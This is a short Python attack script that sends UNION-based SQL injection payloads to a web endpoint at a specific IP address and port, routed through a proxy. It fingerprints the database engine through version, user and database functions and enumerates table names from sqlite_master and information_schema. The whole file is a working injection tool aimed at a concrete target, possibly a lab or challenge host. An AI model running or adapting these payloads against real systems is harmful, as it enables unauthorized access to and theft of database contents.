import sys, re, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "_tools"))
import px, urllib.parse

B = "http://103.163.47.230:34413/?id="
OP = px.opener("http://143.246.138.227:80")


def q(payload):
    s, h, b = px.get(B + urllib.parse.quote(payload, safe=""), OP)
    body = re.sub(r"\s+", " ", b)
    tds = re.findall(r"<td>(.*?)</td>", body)
    m = re.search(r'<div class="msg[^>]*>(.*?)</div>', body)
    return tds, (m.group(1) if m else ""), body


def show(label, payload):
    tds, msg, body = q(payload)
    print("%-42s %s %s" % (label, tds[:6], msg[:70]))
    return tds, msg, body


show("version()", "-1' union select 1,version(),3-- -")
show("sqlite_version()", "-1' union select 1,sqlite_version(),3-- -")
show("database()", "-1' union select 1,database(),3-- -")
show("current_user", "-1' union select 1,current_user(),3-- -")
show("@@version", "-1' union select 1,@@version,3-- -")
show("user()", "-1' union select 1,user(),3-- -")
show("sqlite_master", "-1' union select 1,name,3 from sqlite_master-- -")
show("tables(mysql)", "-1' union select 1,group_concat(table_name),3 from information_schema.tables-- -")
